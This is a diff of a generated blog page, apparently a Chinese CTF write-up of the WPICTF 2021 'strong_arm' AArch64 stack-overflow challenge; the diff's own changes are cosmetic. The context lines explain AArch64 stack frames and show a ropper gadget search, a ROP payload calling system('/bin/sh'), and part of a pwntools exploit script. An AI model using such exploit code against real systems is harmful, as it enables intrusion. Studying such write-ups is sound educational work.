@@ -8,10 +8,10 @@
         <title>Wpictf 2021 Strong_arm - ay3</title><meta name="Description" content="ay3 的个人博客"><meta property="og:title" content="Wpictf 2021 Strong_arm" />
 <meta property="og:description" content="文件来源: strong_arm" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ay3.io/wpictf-2021-strong_arm/" />
-<meta property="og:image" content="https://ay3.io/logo.png"/>
+<meta property="og:url" content="https://ay3.io/wpictf-2021-strong_arm/" /><meta property="og:image" content="https://ay3.io/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-07-28T01:57:54+08:00" />
 <meta property="article:modified_time" content="2021-07-28T02:08:47+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://ay3.io/logo.png"/>
 
@@ -124,31 +124,31 @@
 <p>安装 <code>qemu-user</code>，<code>libc</code> 和 <code>binutils</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu
 </code></pre></td></tr></table>
 </div>
 </div><p>发现交叉编译工具链里没有 <code>ldd</code>，可以用 <code>readelf</code> 替代：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ aarch64-linux-gnu-readelf -a arm <span class="p">|</span> grep <span class="s1">&#39;library&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ aarch64-linux-gnu-readelf -a arm <span class="p">|</span> grep <span class="s1">&#39;library&#39;</span>
  0x0000000000000001 <span class="o">(</span>NEEDED<span class="o">)</span>             Shared library: <span class="o">[</span>libc.so.6<span class="o">]</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>查找 gadget：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 &gt; gadget
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 &gt; gadget
 $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp x29, x30, \[sp\], #0x[0-9a-f]*; ret; $&#39;</span>
 </code></pre></td></tr></table>
 </div>
@@ -156,7 +156,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 <p>非常明显的栈溢出漏洞。但需要注意的是 Aarch64 的函数调用栈栈帧结构与 x86 不同。以该题 <code>main</code> 栈帧为例，<code>x29</code> 和 <code>x30</code> 分别是栈基址寄存器和 <code>lr</code> 。可以看到这两个寄存器的值保存在栈顶，然后才是局部变量。栈帧结构与 x86 正好是相反的。因此发生栈溢出的时候能够修改的是 <code>caller</code> 的返回地址。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -170,7 +170,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004006B0                 STP             X29, X30, [SP,#var_20]!
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004006B0                 STP             X29, X30, [SP,#var_20]!
 .text:00000000004006B4                 MOV             X29, SP
 .text:00000000004006B8                 STR             W0, [X29,#0x20+var_4]
 .text:00000000004006BC                 STR             X1, [X29,#0x20+var_10]
@@ -187,12 +187,12 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 </div><p>由于 <code>ret</code> 指令不从栈上取返回地址，而是从 <code>x30</code> 取，因此 rop chain 的构造比 x86 要困难一些。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;</span>
 <span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x0000000000063e1c</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span>
 </code></pre></td></tr></table>
@@ -201,7 +201,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 <p>完整 exp 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -226,7 +226,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 
@@ -236,7 +236,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;qemu-aarch64 -L /usr/aarch64-linux-gnu arm&#39;</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">))</span>
 
-<span class="c1"># ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;</span>
+<span class="c1"># ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;</span>
 <span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x0000000000063e1c</span>
 
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;print at &#39;</span><span class="p">)</span>
@@ -282,7 +282,7 @@ $ cat gadget <span class="p">|</span> grep <span class="s1">&#39;: ldr x0.*; ldp
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://ay3.io" target="_blank">ay3</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
